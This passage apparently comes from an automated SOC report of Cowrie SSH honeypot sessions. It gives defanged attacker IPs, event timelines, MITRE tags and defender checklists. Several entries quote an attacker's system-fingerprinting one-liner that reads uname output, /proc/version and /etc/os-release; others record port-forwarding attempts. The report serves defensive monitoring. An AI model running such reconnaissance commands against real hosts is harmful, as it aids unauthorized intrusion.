| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:19:51` | `cowrie.session.connect` |
| `2026-07-09 19:19:52` | `cowrie.client.version` |
| `2026-07-09 19:19:52` | `cowrie.client.kex` |
| `2026-07-09 19:19:54` | `cowrie.login.success` |
| `2026-07-09 19:19:55` | `cowrie.session.params` |
| `2026-07-09 19:19:55` | `cowrie.command.input` |
| `2026-07-09 19:19:55` | `cowrie.command.input` |
| `2026-07-09 19:19:55` | `cowrie.command.input` |
| `2026-07-09 19:19:55` | `cowrie.command.input` |
| `2026-07-09 19:19:55` | `cowrie.command.input` |
| `2026-07-09 19:19:55` | `cowrie.command.success` |
| `2026-07-09 19:19:55` | `cowrie.command.input` |
| `2026-07-09 19:19:55` | `cowrie.command.input` |
| `2026-07-09 19:19:55` | `cowrie.command.input` |
| `2026-07-09 19:19:55` | `cowrie.command.input` |
| `2026-07-09 19:19:56` | `cowrie.log.closed` |
| `2026-07-09 19:19:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9a6ae5ca3e4

| Field | Detail |
|---|---|
| **Source IP** | `172.90.128[.]97` |
| **First Seen** | 2026-07-09 19:19 |
| **Last Seen** | 2026-07-09 19:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:19:53` | `cowrie.session.connect` |
| `2026-07-09 19:19:54` | `cowrie.client.version` |
| `2026-07-09 19:19:54` | `cowrie.client.kex` |
| `2026-07-09 19:19:55` | `cowrie.login.success` |
| `2026-07-09 19:19:56` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:20:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.90.128[.]97` to AbuseIPDB if not already reported
- [ ] Block `172.90.128[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e60b6e66d8af

| Field | Detail |
|---|---|
| **Source IP** | `124.88.174[.]143` |
| **First Seen** | 2026-07-09 19:20 |
| **Last Seen** | 2026-07-09 19:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:20:02` | `cowrie.session.connect` |
| `2026-07-09 19:20:03` | `cowrie.client.version` |
| `2026-07-09 19:20:03` | `cowrie.client.kex` |
| `2026-07-09 19:20:05` | `cowrie.login.success` |
| `2026-07-09 19:20:06` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:20:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.88.174[.]143` to AbuseIPDB if not already reported
- [ ] Block `124.88.174[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e87aee7507c6

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 19:21 |
| **Last Seen** | 2026-07-09 19:21 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:21:04` | `cowrie.session.connect` |
| `2026-07-09 19:21:06` | `cowrie.client.version` |
| `2026-07-09 19:21:06` | `cowrie.client.kex` |
| `2026-07-09 19:21:11` | `cowrie.login.success` |
| `2026-07-09 19:21:16` | `cowrie.session.params` |
| `2026-07-09 19:21:16` | `cowrie.command.input` |
| `2026-07-09 19:21:17` | `cowrie.log.closed` |
| `2026-07-09 19:21:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee4d22be4db9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:21 |
| **Last Seen** | 2026-07-09 19:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:21:13` | `cowrie.session.connect` |
| `2026-07-09 19:21:14` | `cowrie.client.version` |
| `2026-07-09 19:21:14` | `cowrie.client.kex` |
| `2026-07-09 19:21:16` | `cowrie.login.success` |
| `2026-07-09 19:21:17` | `cowrie.session.params` |
| `2026-07-09 19:21:17` | `cowrie.command.input` |
| `2026-07-09 19:21:17` | `cowrie.command.input` |
| `2026-07-09 19:21:17` | `cowrie.command.input` |
| `2026-07-09 19:21:17` | `cowrie.command.input` |
| `2026-07-09 19:21:17` | `cowrie.command.input` |
| `2026-07-09 19:21:17` | `cowrie.command.success` |
| `2026-07-09 19:21:17` | `cowrie.command.input` |
| `2026-07-09 19:21:17` | `cowrie.command.input` |
| `2026-07-09 19:21:17` | `cowrie.command.input` |
| `2026-07-09 19:21:17` | `cowrie.command.input` |
| `2026-07-09 19:21:18` | `cowrie.log.closed` |
| `2026-07-09 19:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3ea9997d101

| Field | Detail |
|---|---|
| **Source IP** | `207.254.22[.]207` |
| **First Seen** | 2026-07-09 19:22 |
| **Last Seen** | 2026-07-09 19:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:22:24` | `cowrie.session.connect` |
| `2026-07-09 19:22:25` | `cowrie.client.version` |
| `2026-07-09 19:22:25` | `cowrie.client.kex` |
| `2026-07-09 19:22:25` | `cowrie.login.success` |
| `2026-07-09 19:22:25` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.254.22[.]207` to AbuseIPDB if not already reported
- [ ] Block `207.254.22[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a21c71491f5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:22 |
| **Last Seen** | 2026-07-09 19:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:22:34` | `cowrie.session.connect` |
| `2026-07-09 19:22:34` | `cowrie.client.version` |
| `2026-07-09 19:22:34` | `cowrie.client.kex` |
| `2026-07-09 19:22:36` | `cowrie.login.success` |
| `2026-07-09 19:22:38` | `cowrie.session.params` |
| `2026-07-09 19:22:38` | `cowrie.command.input` |
| `2026-07-09 19:22:38` | `cowrie.command.input` |
| `2026-07-09 19:22:38` | `cowrie.command.input` |
| `2026-07-09 19:22:38` | `cowrie.command.input` |
| `2026-07-09 19:22:38` | `cowrie.command.input` |
| `2026-07-09 19:22:38` | `cowrie.command.success` |
| `2026-07-09 19:22:38` | `cowrie.command.input` |
| `2026-07-09 19:22:38` | `cowrie.command.input` |
| `2026-07-09 19:22:38` | `cowrie.command.input` |
| `2026-07-09 19:22:38` | `cowrie.command.input` |
| `2026-07-09 19:22:38` | `cowrie.log.closed` |
| `2026-07-09 19:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcce8d1a4bab

| Field | Detail |
|---|---|
| **Source IP** | `196.219.93[.]108` |
| **First Seen** | 2026-07-09 19:22 |
| **Last Seen** | 2026-07-09 19:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:22:35` | `cowrie.session.connect` |
| `2026-07-09 19:22:35` | `cowrie.client.version` |
| `2026-07-09 19:22:35` | `cowrie.client.kex` |
| `2026-07-09 19:22:37` | `cowrie.login.success` |
| `2026-07-09 19:22:37` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:22:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.219.93[.]108` to AbuseIPDB if not already reported
- [ ] Block `196.219.93[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6cdefbdee34

| Field | Detail |
|---|---|
| **Source IP** | `182.135.63[.]175` |
| **First Seen** | 2026-07-09 19:23 |
| **Last Seen** | 2026-07-09 19:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:23:23` | `cowrie.session.connect` |
| `2026-07-09 19:23:24` | `cowrie.client.version` |
| `2026-07-09 19:23:24` | `cowrie.client.kex` |
| `2026-07-09 19:23:26` | `cowrie.login.success` |
| `2026-07-09 19:23:27` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:23:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.135.63[.]175` to AbuseIPDB if not already reported
- [ ] Block `182.135.63[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2c5b2980e85

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:23 |
| **Last Seen** | 2026-07-09 19:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:23:56` | `cowrie.session.connect` |
| `2026-07-09 19:23:57` | `cowrie.client.version` |
| `2026-07-09 19:23:57` | `cowrie.client.kex` |
| `2026-07-09 19:23:59` | `cowrie.login.success` |
| `2026-07-09 19:24:00` | `cowrie.session.params` |
| `2026-07-09 19:24:00` | `cowrie.command.input` |
| `2026-07-09 19:24:00` | `cowrie.command.input` |
| `2026-07-09 19:24:00` | `cowrie.command.input` |
| `2026-07-09 19:24:00` | `cowrie.command.input` |
| `2026-07-09 19:24:00` | `cowrie.command.input` |
| `2026-07-09 19:24:00` | `cowrie.command.success` |
| `2026-07-09 19:24:00` | `cowrie.command.input` |
| `2026-07-09 19:24:00` | `cowrie.command.input` |
| `2026-07-09 19:24:00` | `cowrie.command.input` |
| `2026-07-09 19:24:00` | `cowrie.command.input` |
| `2026-07-09 19:24:01` | `cowrie.log.closed` |
| `2026-07-09 19:24:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3380aec48d07

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:25 |
| **Last Seen** | 2026-07-09 19:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:25:20` | `cowrie.session.connect` |
| `2026-07-09 19:25:20` | `cowrie.client.version` |
| `2026-07-09 19:25:20` | `cowrie.client.kex` |
| `2026-07-09 19:25:21` | `cowrie.login.success` |
| `2026-07-09 19:25:23` | `cowrie.session.params` |
| `2026-07-09 19:25:23` | `cowrie.command.input` |
| `2026-07-09 19:25:23` | `cowrie.command.input` |
| `2026-07-09 19:25:23` | `cowrie.command.input` |
| `2026-07-09 19:25:23` | `cowrie.command.input` |
| `2026-07-09 19:25:23` | `cowrie.command.input` |
| `2026-07-09 19:25:23` | `cowrie.command.success` |
| `2026-07-09 19:25:23` | `cowrie.command.input` |
| `2026-07-09 19:25:23` | `cowrie.command.input` |
| `2026-07-09 19:25:23` | `cowrie.command.input` |
| `2026-07-09 19:25:23` | `cowrie.command.input` |
| `2026-07-09 19:25:23` | `cowrie.log.closed` |
| `2026-07-09 19:25:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdc0419e8fae

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]2` |
| **First Seen** | 2026-07-09 19:25 |
| **Last Seen** | 2026-07-09 19:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:25:29` | `cowrie.session.connect` |
| `2026-07-09 19:25:30` | `cowrie.client.version` |
| `2026-07-09 19:25:30` | `cowrie.client.kex` |
| `2026-07-09 19:25:32` | `cowrie.login.success` |
| `2026-07-09 19:25:32` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]2` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4890eda4bd6a

| Field | Detail |
|---|---|
| **Source IP** | `221.224.159[.]218` |
| **First Seen** | 2026-07-09 19:25 |
| **Last Seen** | 2026-07-09 19:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:25:38` | `cowrie.session.connect` |
| `2026-07-09 19:25:38` | `cowrie.client.version` |
| `2026-07-09 19:25:38` | `cowrie.client.kex` |
| `2026-07-09 19:25:41` | `cowrie.login.success` |
| `2026-07-09 19:25:41` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.224.159[.]218` to AbuseIPDB if not already reported
- [ ] Block `221.224.159[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99853819ded7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:26 |
| **Last Seen** | 2026-07-09 19:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:26:37` | `cowrie.session.connect` |
| `2026-07-09 19:26:37` | `cowrie.client.version` |
| `2026-07-09 19:26:37` | `cowrie.client.kex` |
| `2026-07-09 19:26:39` | `cowrie.login.success` |
| `2026-07-09 19:26:41` | `cowrie.session.params` |
| `2026-07-09 19:26:41` | `cowrie.command.input` |
| `2026-07-09 19:26:41` | `cowrie.command.input` |
| `2026-07-09 19:26:41` | `cowrie.command.input` |
| `2026-07-09 19:26:41` | `cowrie.command.input` |
| `2026-07-09 19:26:41` | `cowrie.command.input` |
| `2026-07-09 19:26:41` | `cowrie.command.success` |
| `2026-07-09 19:26:41` | `cowrie.command.input` |
| `2026-07-09 19:26:41` | `cowrie.command.input` |
| `2026-07-09 19:26:41` | `cowrie.command.input` |
| `2026-07-09 19:26:41` | `cowrie.command.input` |
| `2026-07-09 19:26:41` | `cowrie.log.closed` |
| `2026-07-09 19:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea9d92326753

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:27 |
| **Last Seen** | 2026-07-09 19:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:27:54` | `cowrie.session.connect` |
| `2026-07-09 19:27:54` | `cowrie.client.version` |
| `2026-07-09 19:27:54` | `cowrie.client.kex` |
| `2026-07-09 19:27:56` | `cowrie.login.success` |
| `2026-07-09 19:27:58` | `cowrie.session.params` |
| `2026-07-09 19:27:58` | `cowrie.command.input` |
| `2026-07-09 19:27:58` | `cowrie.command.input` |
| `2026-07-09 19:27:58` | `cowrie.command.input` |
| `2026-07-09 19:27:58` | `cowrie.command.input` |
| `2026-07-09 19:27:58` | `cowrie.command.input` |
| `2026-07-09 19:27:58` | `cowrie.command.success` |
| `2026-07-09 19:27:58` | `cowrie.command.input` |
| `2026-07-09 19:27:58` | `cowrie.command.input` |
| `2026-07-09 19:27:58` | `cowrie.command.input` |
| `2026-07-09 19:27:58` | `cowrie.command.input` |
| `2026-07-09 19:27:58` | `cowrie.log.closed` |
| `2026-07-09 19:27:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e2d74f9daf1

| Field | Detail |
|---|---|
| **Source IP** | `211.228.97[.]97` |
| **First Seen** | 2026-07-09 19:28 |
| **Last Seen** | 2026-07-09 19:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:28:55` | `cowrie.session.connect` |
| `2026-07-09 19:28:56` | `cowrie.client.version` |
| `2026-07-09 19:28:56` | `cowrie.client.kex` |
| `2026-07-09 19:28:59` | `cowrie.login.success` |
| `2026-07-09 19:28:59` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:29:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.97[.]97` to AbuseIPDB if not already reported
- [ ] Block `211.228.97[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9abb58fb1a0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:29 |
| **Last Seen** | 2026-07-09 19:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:29:13` | `cowrie.session.connect` |
| `2026-07-09 19:29:13` | `cowrie.client.version` |
| `2026-07-09 19:29:13` | `cowrie.client.kex` |
| `2026-07-09 19:29:15` | `cowrie.login.success` |
| `2026-07-09 19:29:17` | `cowrie.session.params` |
| `2026-07-09 19:29:17` | `cowrie.command.input` |
| `2026-07-09 19:29:17` | `cowrie.command.input` |
| `2026-07-09 19:29:17` | `cowrie.command.input` |
| `2026-07-09 19:29:17` | `cowrie.command.input` |
| `2026-07-09 19:29:17` | `cowrie.command.input` |
| `2026-07-09 19:29:17` | `cowrie.command.success` |
| `2026-07-09 19:29:17` | `cowrie.command.input` |
| `2026-07-09 19:29:17` | `cowrie.command.input` |
| `2026-07-09 19:29:17` | `cowrie.command.input` |
| `2026-07-09 19:29:17` | `cowrie.command.input` |
| `2026-07-09 19:29:17` | `cowrie.log.closed` |
| `2026-07-09 19:29:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e91afe3c67b0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:30 |
| **Last Seen** | 2026-07-09 19:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
